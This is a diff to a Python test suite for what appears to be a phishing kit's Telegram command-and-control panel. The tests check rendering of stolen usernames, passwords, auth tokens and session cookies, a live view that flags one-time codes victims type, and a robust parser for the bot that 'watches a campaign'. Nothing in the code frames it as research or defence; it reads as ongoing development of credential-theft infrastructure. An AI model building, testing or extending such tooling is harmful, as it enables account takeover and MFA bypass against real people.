@@ -326,22 +326,22 @@ class TestRendering:
     def test_one_session_shows_credentials_tokens_and_cookies(self):
         out = tg.render_session({
             "sid": "s1", "state": "session", "ip": "1.2.3.4", "country": "IN",
-            "credentials": {"username": "suraj", "password": "hunter2"},
+            "credentials": {"username": "james", "password": "hunter2"},
             "tokens": ["auth_token"], "device_token": "dev1",
             "cookies": [{"name": "auth_token", "domain": "example.test"}],
             "timeline": [{"what": "creds", "detail": "username,password"}],
         })
-        assert "username = suraj" in out and "password = hunter2" in out
+        assert "username = james" in out and "password = hunter2" in out
         assert "auth_token" in out and "dev1" in out and "creds:" in out
 
     def test_missing_session(self):
         assert tg.render_session(None) == "session not found"
 
     def test_live_view_flags_a_one_time_code(self):
-        events = [{"k": "input", "n": "user", "v": "suraj", "len": 5, "t": "text"},
+        events = [{"k": "input", "n": "user", "v": "james", "len": 5, "t": "text"},
                   {"k": "input", "n": "otp", "v": "123456", "len": 6, "t": "text"}]
         out = tg.render_live(events)
-        assert "user [text] = suraj" in out
+        assert "user [text] = james" in out
         assert "otp [text] = 123456" in out and "one-time code" in out
         assert "codes seen: otp" in out
 
@@ -384,3 +384,35 @@ class TestRendering:
         assert parts[0] == "first"
         assert parts[-1] == "last"
         assert "".join(parts[1:-1]) == "B" * 5000
+
+
+class TestParseIsTotal:
+    """The docstring promises total parsing, and the poll loop depends on it: a malformed
+    update must not raise inside the thread that watches a campaign."""
+
+    @pytest.mark.parametrize("update", [
+        {"message": {"chat": "not-a-dict", "text": "hi"}},
+        {"message": {"chat": 5, "text": "hi"}},
+        {"message": {"chat": ["x"], "text": "hi"}},
+        {"message": {"chat": None, "text": None}},
+        {"message": "nope"},
+        {"callback_query": {"message": {"chat": "nope"}, "data": "x", "id": "1"}},
+        {"callback_query": {"message": "nope", "data": "x", "id": "1"}},
+        {"callback_query": {}},
+        None, [], "x", 7,
+    ])
+    def test_a_malformed_update_never_raises(self, update):
+        chat, text, callback = tg.C2.parse(update)
+        for value in (chat, text, callback):
+            assert value is None or isinstance(value, str)
+
+    def test_a_well_formed_update_still_parses(self):
+        chat, text, callback = tg.C2.parse({"message": {"chat": {"id": 42},
+                                                          "text": "/stats"}})
+        assert (chat, text, callback) == ("42", "/stats", None)
+
+    def test_a_well_formed_callback_still_parses(self):
+        chat, data, callback = tg.C2.parse(
+            {"callback_query": {"message": {"chat": {"id": 7}}, "data": "live:sid",
+                                "id": "cb-1"}})
+        assert (chat, data, callback) == ("7", "live:sid", "cb-1")
